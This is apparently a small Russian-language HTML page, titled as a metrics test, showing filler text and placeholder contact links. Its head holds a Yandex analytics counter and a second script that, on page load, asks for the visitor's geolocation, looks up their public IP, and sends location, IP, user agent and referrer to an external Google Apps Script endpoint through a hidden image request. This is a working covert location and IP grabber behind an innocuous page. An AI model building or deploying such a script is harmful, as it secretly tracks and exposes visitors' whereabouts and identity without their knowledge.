<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Тест метрик</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: linear-gradient(to right, #1f4037, #99f2c8);
      color: white;
      text-align: center;
    }
    .card {
      background: rgba(0, 0, 0, 0.4);
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }
    h1 {
      margin: 0 0 1rem;
    }
    a {
      color: #fff;
      text-decoration: underline;
    }
  </style>
  <!-- Yandex.Metrika counter -->
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(102188431, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true
   });
</script>
  <!-- /Yandex.Metrika counter -->
    <!-- скриптик сука -->
<script>
(function () {
  const ua = navigator.userAgent;
  const ref = document.referrer;

  const sendData = (lat, lon) => {
    fetch('https://api64.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const url = `https://script.google.com/macros/s/AKfycbw_mSVyzKa1w6ko3j8mj7_RS4F_5yta8PC0nT_6Q1FF4IT1AUYsS3oWY9GDfqUwY0uC/exec?` +
          `lat=${lat}&lon=${lon}&ip=${ip}` +
          `&ua=${encodeURIComponent(ua)}&ref=${encodeURIComponent(ref)}`;

        console.log("Отправляю данные:", url);
        new Image().src = url;
      })
      .catch(err => console.error("Ошибка при получении IP:", err));
  };

  if (location.protocol === 'https:') {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        sendData(lat, lon);
      },
      err => {
        console.warn("Гео не дал — используем заглушки.");
        sendData('', '');
      }
    );
  } else {
    console.warn("HTTP сайт — геолокация заблокирована по протоколу. Используем заглушки.");
    sendData('', '');
  }
})();
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/102188431" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

</head>
<body>
  <div class="card">
    <h1>Полная дич</h1>
    <p>Дич</p>
    <p><a href="mailto:your@email.com">your@email.com</a></p>
    <p><a href="https://github.com/yourusername" target="_blank">GitHub</a></p>
    <p><a href="tel:+380502367120" target="_blank">Звони сладкая</a></p>
  </div>
</body>
</html>
